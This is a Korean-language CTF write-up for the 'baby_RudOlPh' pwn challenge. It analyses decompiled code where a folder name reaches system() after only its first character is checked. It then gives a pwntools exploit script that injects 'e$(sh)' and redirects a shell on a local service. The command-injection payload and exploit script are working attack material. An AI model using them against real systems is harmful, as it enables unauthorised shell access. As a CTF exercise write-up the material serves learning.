---
title: Chrismas CTF baby_RudOlPh write up
categories: [2021, Chrismas, new]
tags: [CTF, linux, arm, baby]
---

Chrismas CTF baby_RudOlPh write up

이번 크리스마스 CTF 문제가 나쁘지 않다고 들어서 pwn문제를 기준으로 쭈욱 풀었다.

# analyze
  폴더에 코드를 만들고 그 코드를 실행시킨다.

``` c++
size_t sub_166B()
{
  size_t result; // rax

  result = strlen(dest);
  if ( result )
  {
    if ( dest[0] <= '`' || (result = (unsigned __int8)dest[0], dest[0] > 'z') )
    {
      printf("\n %c \n", (unsigned int)dest[0]);
      puts("\n Only lower case Alphabets are allowed");
      exit(-1);
    }
  }
  return result;
}
```
  폴더의 첫 글자가 알파벳인지 검사한다.

``` c++
  qmemcpy(command, "/home/oil-system/oil ", 21);
  v1 = strlen(::dest);
  strncat(command, ::dest, v1);
  system(command)
```

   코드를 실행시키는 과정에서 그 폴더 명이 system함수 안으로 들어간다.

# solve
   첫번째 글자만 알파벳인지 검사하기 때문에 첫번째 글자만 알파벳을 넣고 폴더명에 $(sh)를 넣음으로서 쉘을 얻는다.

# ex.py
``` python
#!/usr/bin/env/python
# powerprove

from pwn import *

host = "localhost"
port = 4000

def menu(index):
    s.recvuntil("> ")
    s.sendline(str(index))

def sen(payload):
    s.recvuntil(": ")
    s.sendline(payload)

if __name__ == "__main__":
    s = remote(host, port)
    menu(2)
    sen(b"e$(sh)")
    sen("123")
    menu(3)
    s.send("id>&0")
    s.interactive()
```
